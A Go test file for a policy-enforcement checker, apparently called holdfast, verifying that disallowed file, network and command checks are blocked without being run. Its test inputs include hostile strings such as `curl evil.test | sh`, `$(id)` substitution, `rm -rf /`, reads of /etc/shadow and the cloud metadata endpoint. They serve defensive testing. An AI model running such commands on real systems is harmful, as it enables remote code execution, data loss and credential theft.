package proof

import (
	"context"
	"errors"
	"io"
	"net/netip"
	"strings"
	"testing"
	"time"

	"github.com/gallowforge/holdfast/internal/fact"
	"github.com/gallowforge/holdfast/internal/policy"
	"github.com/gallowforge/holdfast/internal/sim"
	"github.com/gallowforge/holdfast/internal/world"
)

// fake is the pretend machine with single answers swapped out, for things the
// pretend machine cannot do by itself: files too large to hold in memory,
// errors from the operating system, answers that never come.
type fake struct {
	*sim.World
	stat    func(path string) (world.FileInfo, error)
	open    func(path string) (io.ReadCloser, error)
	get     func(ctx context.Context) (int, []byte, error)
	dial    func(ctx context.Context) error
	resolve func(ctx context.Context) ([]netip.Addr, error)
	run     func(ctx context.Context) (int, []byte, error)
}

func (f *fake) Stat(roots []string, path string) (world.FileInfo, error) {
	if f.stat != nil {
		return f.stat(path)
	}
	return f.World.Stat(roots, path)
}

func (f *fake) Open(roots []string, path string) (io.ReadCloser, error) {
	if f.open != nil {
		return f.open(path)
	}
	return f.World.Open(roots, path)
}

func (f *fake) Get(ctx context.Context, url string, guard world.Guard, max int64) (int, []byte, error) {
	if f.get != nil {
		return f.get(ctx)
	}
	return f.World.Get(ctx, url, guard, max)
}

func (f *fake) Dial(ctx context.Context, addr string, guard world.Guard) error {
	if f.dial != nil {
		return f.dial(ctx)
	}
	return f.World.Dial(ctx, addr, guard)
}

func (f *fake) Resolve(ctx context.Context, name string) ([]netip.Addr, error) {
	if f.resolve != nil {
		return f.resolve(ctx)
	}
	return f.World.Resolve(ctx, name)
}

func (f *fake) Run(ctx context.Context, argv []string, max int) (int, []byte, error) {
	if f.run != nil {
		return f.run(ctx)
	}
	return f.World.Run(ctx, argv, max)
}

// blockedBoth runs a check and the same check with "not" in front. Both must
// come back blocked with the same words: a check that was not run says nothing
// either way.
func blockedBoth(t *testing.T, w world.World, p *policy.Policy, c fact.Check, want string) {
	t.Helper()
	for _, not := range []bool{false, true} {
		c := c
		c.Not = not
		ev := Run(bg, w, p, &c)
		if ev.Status != fact.Blocked || ev.Detail != want {
			t.Errorf("%s\n got %s: %s\nwant blocked: %s", c.String(), ev.Status, ev.Detail, want)
		}
		oneLine(t, c.String(), ev)
	}
}

// What the policy does not allow is never run, never "broken", and the
// evidence says what a person would type to allow it.
func TestPolicyRefusals(t *testing.T) {
	other := strings.Repeat("ab", 32)
	loopback := policy.Default() // the project folder and this machine, no commands
	nothing := &policy.Policy{}
	docs := &policy.Policy{Files: []string{"backups"}}
	private, err := policy.Parse("net private\nnet meta.test\ncmd systemctl is-active docker\ncmd make *\n")
	if err != nil {
		t.Fatal(err)
	}
	const (
		files = " is outside the folders the policy allows. A person can allow it: holdfast allow files "
		conn  = "the policy does not allow connections to "
		net   = ". A person can allow it: holdfast allow net "
		cmd   = "the policy does not allow the command: "
	)
	tests := []struct {
		p    *policy.Policy
		line string
		want string
	}{
		{loopback, "file ../outside.txt", "../outside.txt" + files + ".."},
		{loopback, "file /etc/passwd", "/etc/passwd" + files + "/etc"},
		{loopback, "contains /etc/passwd root", "/etc/passwd" + files + "/etc"},
		{loopback, "matches ../../etc/shadow ^root", "../../etc/shadow" + files + "../../etc"},
		{loopback, "unchanged /etc/hosts " + other, "/etc/hosts" + files + "/etc"},
		{loopback, "fresh /var/log/syslog 1h", "/var/log/syslog" + files + "/var/log"},
		{nothing, "file go.mod", "go.mod" + files + "."},
		{nothing, "contains secrets.env API_KEY", "secrets.env" + files + "."},
		{docs, "file go.mod", "go.mod" + files + "."},
		{docs, "contains secrets.env " + fileSecret, "secrets.env" + files + "."},
		{docs, `file "my notes/todo.md"`, "my notes/todo.md" + files + "'my notes'"},
		{docs, "fresh logs/app/today.log 1h", "logs/app/today.log" + files + "logs/app"},

		{loopback, "http 200 https://example.com/", conn + "example.com" + net + "example.com"},
		{loopback, "http 200 https://example.com/?token=" + querySecret, conn + "example.com" + net + "example.com"},
		{loopback, "http 200 https://Example.COM:8443/x ok", conn + "example.com" + net + "example.com"},
		{loopback, "port db.internal:5432", conn + "db.internal" + net + "db.internal"},
		{loopback, "port 10.0.0.5:5432", conn + "10.0.0.5" + net + "10.0.0.5"},
		{loopback, "port [2001:db8::1]:443", conn + "2001:db8::1" + net + "2001:db8::1"},
		{loopback, "dns example.com", conn + "example.com" + net + "example.com"},
		{loopback, "dns nowhere.test 10.0.0.1", conn + "nowhere.test" + net + "nowhere.test"},
		{nothing, "http 200 http://localhost:8080/healthz", conn + "localhost" + net + "localhost"},
		{nothing, "port localhost:8080", conn + "localhost" + net + "localhost"},
		{nothing, "port 127.0.0.1:8080", conn + "127.0.0.1" + net + "127.0.0.1"},
		{nothing, "dns localhost", conn + "localhost" + net + "localhost"},
		// The name passes, the address it leads to does not.
		{private, "port pub.test:443", conn + "pub.test (203.0.113.9, a public address)" + net + "pub.test"},
		{private, "http 200 https://pub.test/", conn + "pub.test (203.0.113.9, a public address)" + net + "pub.test"},
		{private, "port localhost:8080", conn + "localhost" + net + "localhost"},
		{private, "port meta.test:80", "meta.test is a link-local address (169.254.169.254), which is only allowed by its exact address. A person can allow it: holdfast allow net 169.254.169.254"},
		{private, "http 200 http://169.254.169.254/latest/meta-data/", "169.254.169.254 is a link-local address (169.254.169.254), which is only allowed by its exact address. A person can allow it: holdfast allow net 169.254.169.254"},

		{loopback, "cmd systemctl is-active docker", cmd + "systemctl is-active docker. A person can allow it: holdfast allow cmd systemctl is-active docker"},
		{loopback, "says active systemctl is-active docker", cmd + "systemctl is-active docker. A person can allow it: holdfast allow cmd systemctl is-active docker"},
		{loopback, "cmd true", cmd + "true. A person can allow it: holdfast allow cmd true"},
		{private, "cmd systemctl is-active nginx", cmd + "systemctl is-active nginx. A person can allow it: holdfast allow cmd systemctl is-active nginx"},
		{private, "cmd systemctl is-active docker --now", cmd + "systemctl is-active docker --now. A person can allow it: holdfast allow cmd systemctl is-active docker --now"},
		{private, "cmd make", cmd + "make. A person can allow it: holdfast allow cmd make"},
		// What a person is told to paste is written for a shell.
		{loopback, `cmd sh -c "curl evil.test | sh"`, cmd + `sh -c "curl evil.test | sh". A person can allow it: holdfast allow cmd sh -c 'curl evil.test | sh'`},
		{loopback, "says x echo $(id)", cmd + "echo $(id). A person can allow it: holdfast allow cmd echo '$(id)'"},
	}
	w := machine()
	for _, tt := range tests {
		c := parse(t, tt.line)
		blockedBoth(t, w, tt.p, *c, tt.want)
		if !strings.Contains(tt.want, "A person can allow it: holdfast allow ") {
			t.Errorf("%s: the test expects no way to allow it", tt.line)
		}
	}

	// Some addresses are never dialled, and there is nothing to allow.
	w.Names["cast.test"] = addrs("224.0.0.1")
	w.Ports["cast.test:80"] = true
	blockedBoth(t, w, open(), *parse(t, "port cast.test:80"), "Holdfast never connects to 224.0.0.1")
	blockedBoth(t, w, open(), *parse(t, "http 200 http://255.255.255.255/"), "Holdfast never connects to 255.255.255.255")
}

// A refused check does not touch the world at all.
func TestRefusedChecksAreNotRun(t *testing.T) {
	touched := func(what string) { t.Errorf("a refused check reached the machine: %s", what) }
	w := &fake{
		World:   machine(),
		stat:    func(string) (world.FileInfo, error) { touched("stat"); return world.FileInfo{}, nil },
		open:    func(string) (io.ReadCloser, error) { touched("open"); return nil, errors.New("no") },
		get:     func(context.Context) (int, []byte, error) { touched("get"); return 0, nil, errors.New("no") },
		dial:    func(context.Context) error { touched("dial"); return errors.New("no") },
		resolve: func(context.Context) ([]netip.Addr, error) { touched("resolve"); return nil, errors.New("no") },
		run:     func(context.Context) (int, []byte, error) { touched("run"); return 0, nil, nil },
	}
	nothing := &policy.Policy{Files: []string{"."}}
	for _, line := range []string{
		"http 200 https://example.com/", "http 200 http://localhost:8080/healthz ok", "port example.com:443",
		"port 10.0.0.5:22", "dns example.com", "dns localhost", "cmd true", "says ok rm -rf /",
	} {
		if ev := Run(bg, w, nothing, parse(t, line)); ev.Status != fact.Blocked {
			t.Errorf("%s = %s: %s", line, ev.Status, ev.Detail)
		}
	}
}

type failing struct{ err error }

func (f failing) Read([]byte) (int, error) { return 0, f.err }
func (failing) Close() error               { return nil }

// A check that cannot be run is blocked too: the machine gave no answer, so
// nothing is known about the fact.
func TestChecksThatCannotRun(t *testing.T) {
	other := strings.Repeat("ab", 32)
	w, p := machine(), open()
	w.Write("big.log", strings.Repeat("x", MaxScan+1), noon)
	edge := strings.Repeat("x", MaxScan-6) + "needle"
	w.Write("edge.log", edge, noon)

	tests := []struct{ line, want string }{
		// A folder has no text and no fingerprint.
		{"contains backups tar", "backups is a folder, not a file"},
		{"matches backups tar", "backups is a folder, not a file"},
		{"unchanged backups " + other, "backups is a folder, not a file"},
		{"contains . x", ". is a folder, not a file"},
		// Too large to scan.
		{"contains big.log x", "big.log is larger than 8 MiB; Holdfast does not scan files that large"},
		{"matches big.log y", "big.log is larger than 8 MiB; Holdfast does not scan files that large"},
		// Allowed by the policy, and not installed.
		{"cmd missing-program", "could not check: missing-program could not be run: missing-program: executable file not found"},
		{"says x missing-program", "could not check: missing-program could not be run: missing-program: executable file not found"},
	}
	for _, tt := range tests {
		blockedBoth(t, w, p, *parse(t, tt.line), tt.want)
	}

	// The largest file that is still scanned, to its last byte.
	if ev := Run(bg, w, p, parse(t, "contains edge.log needle")); ev.Status != fact.Holds || ev.Detail != `edge.log contains "needle" (line 1)` {
		t.Errorf("a file of exactly %d bytes: %s: %s", MaxScan, ev.Status, ev.Detail)
	}
	// Large files can still be fingerprinted and dated.
	for _, line := range []string{"unchanged big.log " + sum(strings.Repeat("x", MaxScan+1)), "fresh big.log 1h", "file big.log"} {
		if ev := Run(bg, w, p, parse(t, line)); ev.Status != fact.Holds {
			t.Errorf("%s = %s: %s", line, ev.Status, ev.Detail)
		}
	}

	// A check written by hand, past the grammar.
	blockedBoth(t, w, p, fact.Check{Kind: "unchanged", Path: "LICENSE"}, "could not check: no digest was recorded for LICENSE")
	blockedBoth(t, w, p, fact.Check{Kind: "matches", Path: "go.mod", Regex: "("}, "could not check: error parsing regexp: missing closing ): `(`")
	blockedBoth(t, w, p, fact.Check{Kind: "teleport", Path: "go.mod"}, `could not check: unknown check "teleport"`)

	// Too large to fingerprint. Only its size is looked at.
	huge := &fake{World: w,
		stat: func(string) (world.FileInfo, error) {
			return world.FileInfo{Exists: true, Regular: true, Size: MaxHash + 1}, nil
		},
		open: func(string) (io.ReadCloser, error) {
			t.Error("a file too large was opened")
			return nil, errors.New("no")
		},
	}
	blockedBoth(t, huge, p, fact.Check{Kind: "unchanged", Path: "disk.img", Sum: other}, "disk.img is larger than 1 GiB")
	blockedBoth(t, huge, p, fact.Check{Kind: "contains", Path: "disk.img", Text: "x"}, "disk.img is larger than 8 MiB; Holdfast does not scan files that large")

	// A file that grew after its size was looked at is still not scanned.
	grew := &fake{World: w, stat: func(string) (world.FileInfo, error) {
		return world.FileInfo{Exists: true, Regular: true, Size: 10}, nil
	}}
	blockedBoth(t, grew, p, fact.Check{Kind: "contains", Path: "big.log", Text: "x"}, "big.log is larger than 8 MiB; Holdfast does not scan files that large")

	// The operating system says no. Its reason is kept; the full path it puts
	// in front of the reason is not.
	sys := "/home/someone/project/"
	denied := &fake{World: w,
		stat: func(path string) (world.FileInfo, error) {
			if path == "locked" {
				return world.FileInfo{}, errors.New("stat " + sys + path + ": permission denied")
			}
			return world.FileInfo{Exists: true, Regular: true, Size: 3}, nil
		},
		open: func(path string) (io.ReadCloser, error) {
			if path == "torn.txt" {
				return failing{errors.New("read " + sys + path + ": input/output error")}, nil
			}
			return nil, errors.New("open " + sys + path + ": permission denied")
		},
	}
	for _, tt := range []struct {
		c    fact.Check
		want string
	}{
		{fact.Check{Kind: "file", Path: "locked"}, "cannot read locked: permission denied"},
		{fact.Check{Kind: "fresh", Path: "locked", Within: 60}, "cannot read locked: permission denied"},
		{fact.Check{Kind: "contains", Path: "locked", Text: "x"}, "cannot read locked: permission denied"},
		{fact.Check{Kind: "unchanged", Path: "locked", Sum: other}, "cannot read locked: permission denied"},
		{fact.Check{Kind: "contains", Path: "secret.txt", Text: "x"}, "cannot read secret.txt: permission denied"},
		{fact.Check{Kind: "matches", Path: "secret.txt", Regex: "x"}, "cannot read secret.txt: permission denied"},
		{fact.Check{Kind: "unchanged", Path: "secret.txt", Sum: other}, "cannot read secret.txt: permission denied"},
		{fact.Check{Kind: "contains", Path: "torn.txt", Text: "x"}, "cannot read torn.txt: input/output error"},
		{fact.Check{Kind: "unchanged", Path: "torn.txt", Sum: other}, "cannot read torn.txt: input/output error"},
	} {
		blockedBoth(t, denied, p, tt.c, tt.want)
	}

	// A refusal that comes from the machine itself (a link that leads out of
	// the folder) is passed on as it is, wrapped or not.
	link := &policy.Blocked{Why: "notes leads outside the folders the policy allows (through a symbolic link)"}
	linked := &fake{World: w,
		stat: func(string) (world.FileInfo, error) { return world.FileInfo{}, errors.Join(errors.New("x"), link) },
	}
	for _, kind := range []string{"file", "contains", "matches", "unchanged", "fresh"} {
		c := fact.Check{Kind: kind, Path: "notes", Text: "x", Regex: "x", Sum: other, Within: 60}
		blockedBoth(t, linked, p, c, link.Why)
	}
}

// Evidence is one line of at most fact.MaxDetail letters, however long the
// check is and whatever the machine printed.
func TestEvidenceIsOneBoundedLine(t *testing.T) {
	w, p := machine(), open()
	long := strings.Repeat("deep/", 300) + "file.txt"
	text := strings.Repeat("needle ", 100)
	w.Write(long, text, noon)
	w.Write("page.html", text, noon)
	w.Cmds["make "+long] = sim.Result{Exit: 1, Out: strings.Repeat("E", 5000) + "\n" + fileSecret}
	w.Cmds["true "+long] = sim.Result{Out: strings.Repeat("o", 5000)}
	w.Pages["http://localhost:8080/"+long] = sim.Page{Status: 200, Body: text}
	p.Cmds = append(p.Cmds, []string{"make", "**"}, []string{"true", "**"})

	checks := []fact.Check{
		{Kind: "file", Path: long},
		{Kind: "file", Path: long + ".missing"},
		{Kind: "contains", Path: long, Text: text},
		{Kind: "contains", Path: long, Text: "absent " + text},
		{Kind: "matches", Path: long, Regex: "(needle ){50}"},
		{Kind: "matches", Path: long, Regex: "(absent ){50}"},
		{Kind: "unchanged", Path: long, Sum: sum(text)},
		{Kind: "unchanged", Path: long, Sum: sum("other")},
		{Kind: "fresh", Path: long, Within: 60},
		{Kind: "http", Code: 200, URL: "http://localhost:8080/" + long, Text: text},
		{Kind: "http", Code: 200, URL: "http://localhost:8080/" + long + "?q=" + querySecret, Text: "absent " + text},
		{Kind: "http", Code: 500, URL: "http://localhost:8080/" + long},
		{Kind: "port", Addr: strings.Repeat("a", 60) + "." + strings.Repeat("b", 60) + ".test:65000"},
		{Kind: "dns", Name: strings.Repeat("a", 60) + "." + strings.Repeat("b", 60) + ".test", IP: "2001:db8:1234:5678:9abc:def0:1234:5678"},
		{Kind: "cmd", Argv: []string{"make", long}},
		{Kind: "cmd", Argv: []string{"true", long}},
		{Kind: "says", Text: text, Argv: []string{"true", long}},
		{Kind: "cmd", Argv: []string{"unlisted", long}},
		{Kind: "file", Path: "../" + long},
	}
	for _, c := range checks {
		if err := c.Validate(); err != nil {
			t.Fatalf("test check %s: %v", c.Kind, err)
		}
		for _, not := range []bool{false, true} {
			c.Not = not
			ev := Run(bg, w, p, &c)
			oneLine(t, c.Kind+" (long)", ev)
			if len(c.String()) > 2*fact.MaxDetail && !strings.Contains(ev.Detail, "…") {
				t.Errorf("%s: the evidence was not cut although the check is long: %q", c.Kind, ev.Detail)
			}
		}
	}

	// What is searched for is shown cut to sixty letters, as one line.
	ev := Run(bg, w, p, &fact.Check{Kind: "contains", Path: "page.html", Text: text})
	if want := `page.html contains "` + strings.Repeat("needle ", 8) + `nee…" (line 1)`; ev.Detail != want {
		t.Errorf("got %s\nwant %s", ev.Detail, want)
	}
}

// The time of the evidence is the machine's, in UTC, to the millisecond.
func TestEvidenceTime(t *testing.T) {
	ahead := time.FixedZone("UTC+3", 3*3600)
	at := time.Date(2026, 3, 14, 15, 0, 0, 123456789, ahead)
	w := machine()
	w.Clock = func() time.Time { return at }
	ev := Run(bg, w, open(), parse(t, "file go.mod"))
	want := time.Date(2026, 3, 14, 12, 0, 0, 123000000, time.UTC)
	if !ev.At.Equal(want) || ev.At.Location() != time.UTC {
		t.Errorf("At = %v, want %v", ev.At, want)
	}
	// A machine that takes real time is timed by the clock on the wall.
	real := &realTime{World: w}
	if ev := Run(bg, real, open(), parse(t, "file go.mod")); ev.Ms < 0 || ev.Ms > 5000 {
		t.Errorf("Ms = %d", ev.Ms)
	}
}

// realTime hides the pretend machine's Took, as a real machine has none.
type realTime struct{ world.World }
